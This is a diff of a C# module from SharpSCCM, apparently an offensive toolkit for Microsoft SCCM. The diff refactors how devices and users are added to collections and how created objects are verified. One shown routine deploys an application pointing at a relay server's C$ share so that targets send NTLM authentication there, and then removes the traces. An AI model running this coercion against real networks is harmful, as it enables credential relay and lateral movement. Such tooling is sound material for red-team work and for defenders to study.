@@ -1,49 +1,12 @@
 ﻿using System;
 using System.Linq;
 using System.Management;
+using System.Threading;
 
 namespace SharpSCCM
 {
     public static class MgmtPointWmi
     {
-        public static void AddDeviceToCollection(ManagementScope scope, string deviceName, string collectionName)
-        {
-            Console.WriteLine($"[+] Adding {deviceName} to {collectionName}");
-            ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
-            newCollectionRule["QueryExpression"] = $"SELECT * FROM SMS_R_System WHERE Name='{deviceName}'";
-            newCollectionRule["RuleName"] = $"{deviceName}_{Guid.NewGuid()}";
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
-            {
-                ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
-                addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
-                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
-            }
-            Console.WriteLine($"[+] Added {deviceName} to {collectionName}");
-            Console.WriteLine("[+] Waiting 15s for collection to populate");
-            System.Threading.Thread.Sleep(15000);
-            GetCollectionMember(scope, collectionName, false, null, null, false, false);
-        }
-
-        public static void AddUserToCollection(ManagementScope scope, string userName, string collectionName)
-        {
-            Console.WriteLine($"[+] Adding {userName} to {collectionName}");
-            ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
-            newCollectionRule["QueryExpression"] = $"SELECT * FROM SMS_R_User WHERE UniqueUserName='{userName}'";
-            newCollectionRule["RuleName"] = $"{userName}_{Guid.NewGuid()}";
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
-            {
-                ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
-                addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
-                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
-            }
-            Console.WriteLine($"[+] Added {userName} to {collectionName}");
-            Console.WriteLine("[+] Waiting 15s for collection to populate");
-            System.Threading.Thread.Sleep(15000);
-            GetCollectionMember(scope, collectionName, false, null, null, false, false);
-        }
-
         public static void GenerateCCR(string target, string server = null, string siteCode = null)
         {
             ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
@@ -56,8 +19,9 @@ namespace SharpSCCM
             collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
         }
 
-        public static void GetCollectionMember(ManagementScope scope, string name, bool count, string[] properties, string orderBy, bool dryRun, bool verbose)
+        public static ManagementObjectCollection GetCollectionMember(ManagementScope scope, string name, string[] properties = null, bool dryRun = false, bool verbose = false, bool printOutput = true)
         {
+            ManagementObjectCollection collectionMembers = null;
             // Get CollectionID from name
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT CollectionID FROM SMS_Collection WHERE Name='{name}'"));
             ManagementObjectCollection collections = searcher.Get();
@@ -65,13 +29,14 @@ namespace SharpSCCM
             {
                 foreach (ManagementObject collection in collections)
                 {
-                    MgmtUtil.GetClassInstances(scope, "SMS_CollectionMember_a", count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", orderBy, dryRun, verbose);
+                    collectionMembers = MgmtUtil.GetClassInstances(scope, "SMS_CollectionMember_a", null, false, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", null, dryRun, verbose, printOutput: printOutput);
                 }
             }
             else
             {
-                Console.WriteLine($"[+] Found 0 instances of SMS_Collection with Name: {name}");
+                Console.WriteLine($"[+] Found 0 collections named {name}");
             }
+            return collectionMembers;
         }
 
         public static void GetSitePushSettings(ManagementScope wmiConnection = null)
@@ -101,35 +66,35 @@ namespace SharpSCCM
                             Console.WriteLine("[+] Install client software on the following computers:");
                             if (result["Value"].ToString() == "0")
                             {
-                                Console.WriteLine("  Workstations and Servers (including domain controllers)");
+                                Console.WriteLine("      Workstations and Servers (including domain controllers)");
                             }
                             else if (result["Value"].ToString() == "1")
                             {
-                                Console.WriteLine("  Servers only (including domain controllers)");
+                                Console.WriteLine("      Servers only (including domain controllers)");
                             }
                             else if (result["Value"].ToString() == "2")
                             {
-                                Console.WriteLine("  Workstations and Servers (excluding domain controllers)");
+                                Console.WriteLine("      Workstations and Servers (excluding domain controllers)");
                             }
                             else if (result["Value"].ToString() == "3")
                             {
-                                Console.WriteLine("  Servers only (excluding domain controllers)");
+                                Console.WriteLine("      Servers only (excluding domain controllers)");
                             }
                             else if (result["Value"].ToString() == "4")
                             {
-                                Console.WriteLine("  Workstations and domain controllers only (excluding other servers)");
+                                Console.WriteLine("      Workstations and domain controllers only (excluding other servers)");
                             }
                             else if (result["Value"].ToString() == "5")
                             {
-                                Console.WriteLine("  Domain controllers only");
+                                Console.WriteLine("      Domain controllers only");
                             }
                             else if (result["Value"].ToString() == "6")
                             {
-                                Console.WriteLine("  Workstations only");
+                                Console.WriteLine("      Workstations only");
                             }
                             else if (result["Value"].ToString() == "7")
                             {
-                                Console.WriteLine("  No computers");
+                                Console.WriteLine("      No computers");
                             }
                         }
                     }
@@ -180,7 +145,7 @@ namespace SharpSCCM
             string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
             string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
             NewCollection(scope, "device", newCollectionName);
-            AddDeviceToCollection(scope, deviceName, newCollectionName);
+            NewCollectionMember(scope, newCollectionName, null, deviceName);
             if (!String.IsNullOrEmpty(relayServer))
             {
                 NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
@@ -196,7 +161,7 @@ namespace SharpSCCM
             Console.WriteLine("[+] Waiting 1m for NTLM authentication");
             System.Threading.Thread.Sleep(60000);
             Console.WriteLine("[+] Cleaning up");
-            Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
+            Cleanup.RemoveDeployment(scope, $"{newApplicationName}_{newCollectionName}_Install");
             Cleanup.RemoveApplication(scope, newApplicationName);
             Cleanup.RemoveCollection(scope, newCollectionName);
         }
@@ -225,11 +190,7 @@ namespace SharpSCCM
             catch (ManagementException ex)
             {
                 Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                Console.WriteLine("[!] Does your account have the correct permissions?");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
+                Console.WriteLine("[!] Is your account assigned the correct security role?");
             }
         }
 
@@ -412,17 +373,21 @@ namespace SharpSCCM
                 try
                 {
                     application.Put();
+                    ManagementObjectCollection createdApplications = MgmtUtil.GetClassInstances(scope, "SMS_Application", null, false, null, $"LocalizedDisplayName='{name}'");
+                    if (createdApplications.Count > 0)
+                    {
+                        Console.WriteLine("[+] Successfully created application");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] The application was not found after creation");
+                    }
                 }
                 catch (ManagementException ex)
                 {
                     Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                    Console.WriteLine("[!] Does your account have the correct permissions?");
+                    Console.WriteLine("[!] Is your account assigned the correct security role?");
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
-                }
-                MgmtUtil.GetClassInstances(scope, "SMS_Application", false, null, $"LocalizedDisplayName='{name}'");
             }
         }
 
@@ -445,17 +410,126 @@ namespace SharpSCCM
             try
             {
                 collection.Put();
+                ManagementObjectCollection createdCollections = MgmtUtil.GetClassInstances(scope, "SMS_Collection", null, false, null, $"Name='{collectionName}'");
+                if (createdCollections.Count > 0)
+                {
+                    Console.WriteLine("[+] Successfully created collection");
+                }
+                    else
+                {
+                    Console.WriteLine("[!] The collection was not found after creation");
+                }
             }
             catch (ManagementException ex)
             {
                 Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                Console.WriteLine("[!] Does your account have the correct permissions?");
-            }
-            catch (Exception ex)
+                Console.WriteLine("[!] Is your account assigned the correct security role?");
+            }       
+        }
+
+        public static void NewCollectionMember(ManagementScope scope, string collectionName, string collectionType, string deviceName = null, string userName = null, string resourceId = null, int waitTime = 15)
+        {
+            // Use the provided collection type or set to device/user depending on which was provided
+            collectionType = !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : collectionType;
+
+            // Make sure the specified collection exists
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
+            ManagementObjectCollection collections = searcher.Get();
+            if (collections.Count > 0)
             {
-                Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
-            }            
-            MgmtUtil.GetClassInstances(scope, "SMS_Collection", false, null, $"Name='{collectionName}'");
+                // Check if the resource is already a member of the collection
+                ManagementObjectCollection existingMembers = MgmtPointWmi.GetCollectionMember(scope, collectionName, printOutput: false);
+                if (existingMembers.Count > 0)
+                {
+                    foreach (ManagementObject existingMember in existingMembers)
+                    {
+                        if (!string.IsNullOrEmpty(deviceName) && (string)existingMember.GetPropertyValue("Name") == deviceName)
+                        {
+                            Console.WriteLine($"[!] A device named {deviceName} is already a member of the collection");
+                            return;
+                        }
+                        else if (!string.IsNullOrEmpty(userName) && existingMember.GetPropertyValue("Name").ToString().Contains(userName))
+                        {
+                            Console.WriteLine($"[!] A user named {existingMember.GetPropertyValue("Name")} is already a member of the collection");
+                            return;
+                        }
+                        else if (!string.IsNullOrEmpty(resourceId) && (uint)existingMember.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
+                        {
+                            Console.WriteLine($"[!] A resource with ID {resourceId} is already a member of the collection");
+                            return;
+                        }
+                    }
+                }
+                // Make sure the specified resource exists
+                string membershipQuery = null;
+                ManagementObjectCollection matchingResources = null;
+                if (!string.IsNullOrEmpty(resourceId))
+                {
+                    membershipQuery = $"SELECT * FROM SMS_R_{(collectionType == "device" ? "System" : "User")} WHERE ResourceID='{resourceId}'";
+                    matchingResources = MgmtUtil.GetClassInstances(scope, $"SMS_R_{(collectionType == "device" ? "System" : "User")}", membershipQuery);
+
+                }
+                else if (!string.IsNullOrEmpty(deviceName))
+                {
+                    membershipQuery = $"SELECT * FROM SMS_R_System WHERE Name='{deviceName}'";
+                    matchingResources = MgmtUtil.GetClassInstances(scope, "SMS_R_System", membershipQuery);
+                }
+                else if (!string.IsNullOrEmpty(userName))
+                {
+                    membershipQuery = $"SELECT * FROM SMS_R_User WHERE UniqueUserName='{userName}'";
+                    matchingResources = MgmtUtil.GetClassInstances(scope, "SMS_R_User", membershipQuery);
+                }
+                if (matchingResources.Count > 1)
+                {
+                    Console.WriteLine($"[!] Found more than one instance of the specified resource");
+                    Console.WriteLine($"[!] Try using its ResourceID instead (-r)");
+                }
+                else if (matchingResources.Count > 0)
+                {
+                    Console.WriteLine($"[+] Found resource to add to {collectionName}");
+                    ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
+                    newCollectionRule["QueryExpression"] = membershipQuery;
+                    newCollectionRule["RuleName"] = $"{collectionType}_{Guid.NewGuid()}";
+                    foreach (ManagementObject collection in collections)
+                    {
+                        ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
+                        addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
+                        if ((uint)collection.Properties[propertyName: "CollectionType"].Value == 1 && collectionType == "device")
+                        {
+                            Console.WriteLine("[!] Can't add a device to a user collection");
+                        }
+                        else if ((uint)collection.Properties["CollectionType"].Value == 2 && collectionType == "user")
+                        {
+                            Console.WriteLine("[!] Can't add a user to a device collection");
+
+                        }
+                        else
+                        {
+                            try
+                            {
+                                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
+                                Console.WriteLine($"[+] Added resource to {collectionName}");
+                                Console.WriteLine($"[+] Waiting {waitTime}s for collection to populate");
+                                Thread.Sleep(waitTime * 1000);
+                                GetCollectionMember(scope, collectionName);
+                            }
+                            catch (ManagementException ex)
+                            {
+                                Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
+                                Console.WriteLine("[!] Is your account assigned the correct security role?");
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    Console.WriteLine($"[!] Could not find the specified resource");
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[+] Found 0 collections named {collectionName}");
+            }
         }
 
         public static void NewDeployment(ManagementScope scope, string application, string collection)
@@ -522,17 +596,21 @@ namespace SharpSCCM
                 try
                 {
                     deployment.Put();
+                    ManagementObjectCollection createdDeployments = MgmtUtil.GetClassInstances(scope, "SMS_ApplicationAssignment", null, false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
+                    if (createdDeployments.Count > 0)
+                    {
+                        Console.WriteLine("[+] Successfully created deployment");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] The deployment was not found after creation");
+                    }
                 }
                 catch (ManagementException ex)
                 {
                     Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                    Console.WriteLine("[!] Does your account have the correct permissions?");
+                    Console.WriteLine("[!] Is your account assigned the correct security role?");
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
-                }
-                MgmtUtil.GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
             }
         }
     }
